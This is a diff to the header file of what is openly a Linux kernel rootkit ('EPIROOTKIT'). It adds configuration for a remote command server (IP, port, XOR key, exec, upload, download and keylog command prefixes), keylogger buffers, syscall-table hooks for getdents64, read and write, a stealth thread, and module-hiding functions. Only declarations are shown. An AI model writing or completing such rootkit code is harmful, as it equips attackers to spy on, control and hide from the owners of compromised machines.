@@ -25,10 +25,49 @@
 #include <linux/jiffies.h>
 #include <linux/delay.h>
 
+// Error codes
+#define ROOTKIT_ERROR_FILE    1
+#define ROOTKIT_ERROR_MEMORY  2
+#define ROOTKIT_ERROR_NETWORK 3
+
+// Configuration structures
+struct rootkit_config {
+    int port;
+    const char *server_ip;
+    int buffer_size;
+    const char *xor_key;
+    const char *temp_output_file;
+    const char *command_prefix_auth;
+    const char *command_prefix_exec;
+    const char *command_prefix_upload;
+    const char *command_prefix_download;
+    const char *command_prefix_keylog;
+    int command_prefix_length;
+    const char *shell_path;
+    const char *shell_args;
+    const char *path_env;
+    const char *hidden_dir;
+    int max_hidden_lines;
+    const char *command_prefix_hide_line;
+    const char *command_prefix_unhide_line;
+};
+
+struct keylog_config {
+    int buffer_size;
+    unsigned long flush_interval;
+};
+
+struct memory_manager {
+    void *nonpaged_memory;
+    size_t size;
+    spinlock_t lock;
+};
+
 struct network_manager {
     struct socket *connection;
     bool is_connected;
     spinlock_t lock;
+    struct task_struct *thread;
 };
 
 struct dkom_entry {
@@ -41,9 +80,20 @@ struct hook_entry {
     struct list_head list;
 };
 
+// Global variables
+extern struct rootkit_config config;
+extern struct keylog_config keylog_config;
+extern struct memory_manager mem_manager;
+extern struct network_manager net_manager;
 extern struct list_head dkom_entries;
 extern struct list_head hook_entries;
 extern spinlock_t hook_lock;
+extern spinlock_t dkom_lock;
+extern struct task_struct *g_stealth_thread;
+extern unsigned long *sys_call_table;
+extern asmlinkage long (*original_getdents64)(const struct pt_regs *);
+extern asmlinkage long (*original_read)(const struct pt_regs *);
+extern asmlinkage long (*original_write)(const struct pt_regs *);
 
 // Function declarations
 void dkom_restore_object(void *object);
@@ -52,5 +102,10 @@ void send_error(int error_code, const char *message);
 void send_data(const char *data);
 void apply_xor_cipher(char *data, int len);
 void process_command(const char *command);
+void free_secure_memory(void *ptr);
+void unhide_module(void);
+void keylog_buffer_cleanup(void);
+int keylog_thread(void *data);
+int stealth_thread(void *data);
 
 #endif // EPIROOTKIT_H 
